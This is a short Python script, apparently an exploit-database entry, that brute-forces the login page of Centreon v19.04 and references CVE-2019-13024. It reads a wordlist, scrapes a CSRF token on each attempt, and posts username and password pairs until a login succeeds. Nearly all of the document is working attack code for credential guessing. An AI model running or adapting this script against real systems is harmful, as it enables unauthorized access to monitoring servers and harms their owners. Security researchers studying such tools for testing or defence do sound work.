'''
# Exploit Title: Centreon v19.04 authentication BruteForce
# 
# Shoutout to: Askar (@mohammadaskar2)
# For CVE : CVE-2019-13024
# Vendor Homepage: https://www.centreon.com/
# Modified Askar exploit to find credentials,  def simple pass but fun learning expierence.
# Genxweb: Michael LaSalvia
# run: ./centreon.py http://ip\/centreon admin /path_to_wordlist
'''

import requests
import sys
import warnings
from bs4 import BeautifulSoup

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

if len(sys.argv) != 4:
    print(len(sys.argv))
    print("[~] Usage : ./centreon-exploit.py url username password-list")
    exit()

url = sys.argv[1]
username = sys.argv[2]
passfile = sys.argv[3]

passes = [line.rstrip('\n') for line in open(passfile)]

for password in passes:
    print("Trying pass: ", password)

    request = requests.session()
    print("[+] Retrieving CSRF token to submit the login form")
    page = request.get(url+"/index.php")
    html_content = page.text
    soup = BeautifulSoup(html_content)
    token = soup.findAll('input')[3].get("value")

    login_info = {
    	"useralias": username,
    	"password": password,
    	"submitLogin": "Connect",
    	"centreon_token": token
     }  	
    login_request = request.post(url+"/index.php", login_info)
    print("[+] Login token is : {0}".format(token))
    if "Your credentials are incorrect." not in login_request.text:
     print("[+] Logged In Sucssfully")
     break 
    else:
     print("[-] Wrong credentials")
